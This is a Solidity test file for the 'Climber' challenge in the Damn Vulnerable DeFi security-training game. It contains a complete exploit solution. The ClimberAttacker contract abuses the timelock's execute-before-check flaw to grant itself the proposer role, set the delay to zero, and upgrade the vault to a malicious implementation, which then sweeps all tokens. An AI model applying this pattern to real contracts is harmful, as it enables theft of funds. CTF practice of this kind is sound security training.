// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberAttacker attacker = new ClimberAttacker(
            timelock,
            vault,
            token,
            recovery
        );
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Malicious vault implementation that sweeps all tokens
contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function sweepAll(address token, address to) external {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address) internal override {}
}

contract ClimberAttacker {
    ClimberTimelock private timelock;
    ClimberVault private vault;
    DamnValuableToken private token;
    address private recovery;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault,
        DamnValuableToken _token,
        address _recovery
    ) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // Build the batch of operations to execute via timelock
        // Action 1: Grant PROPOSER_ROLE to this attacker contract
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)))
        );

        // Action 2: Set delay to 0 (so operations are immediately ready)
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(timelock.updateDelay, (0)));

        // Action 3: Upgrade vault to malicious implementation
        MaliciousVault maliciousImpl = new MaliciousVault();
        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeCall(
                vault.upgradeToAndCall,
                (address(maliciousImpl), bytes(""))
            )
        );

        // Action 4: Call this contract to schedule the batch (making it retroactively valid)
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeCall(this.scheduleOperation, ()));

        salt = bytes32("attack");

        // Execute! The timelock runs all actions first, then checks if scheduled.
        // Action 4 schedules this batch during execution.
        timelock.execute(targets, values, dataElements, salt);

        // Now sweep the tokens from the upgraded vault
        MaliciousVault(address(vault)).sweepAll(address(token), recovery);
    }

    // Called by the timelock during execute() — we now have PROPOSER_ROLE, so we can schedule
    function scheduleOperation() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
